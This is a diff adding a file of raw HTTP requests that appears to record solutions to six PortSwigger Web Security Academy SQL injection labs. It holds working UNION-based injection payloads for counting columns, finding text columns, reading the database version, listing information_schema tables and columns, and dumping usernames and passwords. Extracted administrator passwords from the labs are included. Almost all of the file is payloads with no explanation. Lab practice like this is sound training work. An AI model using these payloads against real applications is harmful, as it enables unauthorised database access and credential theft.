@@ -1,0 +1,271 @@
+1) Lab: SQL injection UNION attack, determining the number of columns returned by the query
+
+GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL,+NULL+--+ HTTP/2
+Host: 0ac600fb03c5733186aecaa10019005d.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+2) Lab: SQL injection UNION attack, finding a column containing text
+
+GET /filter?category=Gifts'+ORDER+BY+3+--+ HTTP/2
+Host: 0a280017033fa1b58078c14800bf00cc.web-security-academy.net
+Cookie: session=uEG8ZZJ3NRpTnjXytEanfEjHDgkuSN4k
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a280017033fa1b58078c14800bf00cc.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+NULL,+'5gl0UI',+NULL+--+ HTTP/2
+Host: 0a280017033fa1b58078c14800bf00cc.web-security-academy.net
+Cookie: session=uEG8ZZJ3NRpTnjXytEanfEjHDgkuSN4k
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a280017033fa1b58078c14800bf00cc.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+3) Lab: SQL injection UNION attack, retrieving data from other tables
+
+GET /filter?category=Pets'+ORDER+BY+2+--+ HTTP/2
+Host: 0a3700fe037d26ed83c314af0095000e.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Pets'+UNION+SELECT+username,+password+FROM+users+--+ HTTP/2
+Host: 0a3700fe037d26ed83c314af0095000e.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+administrator
+8flacp58hk6uwg0rggab
+
+4) Lab: SQL injection UNION attack, retrieving multiple values in a single column
+
+GET /filter?category=Gifts'+ORDER+BY+2+--+ HTTP/2
+Host: 0aa000570427c3b38179844600fd0069.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+NULL,+CONCAT(username,+password)+FROM+users+--+ HTTP/2
+Host: 0aa000570427c3b38179844600fd0069.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+administrator
+oztyvb0g0wrezphk988x
+
+5) Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+GET /filter?category=Lifestyle'+ORDER+BY+2+--+ HTTP/2
+Host: 0ac3003d0353135281b470a500470013.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Lifestyle'+UNION+SELECT+%40%40version,+NULL+--+ HTTP/2
+Host: 0ac3003d0353135281b470a500470013.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+6) Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+GET /filter?category=Gifts'+ORDER+BY+2+--+ HTTP/2
+Host: 0a5b005604fb0a61832c004e000a00a1.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+version(),+NULL+--+ HTTP/2
+Host: 0a5b005604fb0a61832c004e000a00a1.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+TABLE_NAME,+NULL+FROM+information_schema.tables+--+ HTTP/2
+Host: 0a5b005604fb0a61832c004e000a00a1.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_fuciaw'+--+ HTTP/2
+Host: 0a5b005604fb0a61832c004e000a00a1.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+GET /filter?category=Gifts'+UNION+SELECT+CONCAT(username_bnufll,+'%3d',+password_swlepf),+NULL+FROM+users_fuciaw+--+ HTTP/2
+Host: 0a5b005604fb0a61832c004e000a00a1.web-security-academy.net
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+---
+
+administrator=yitm9fqzlwppm0x64pht
+
+
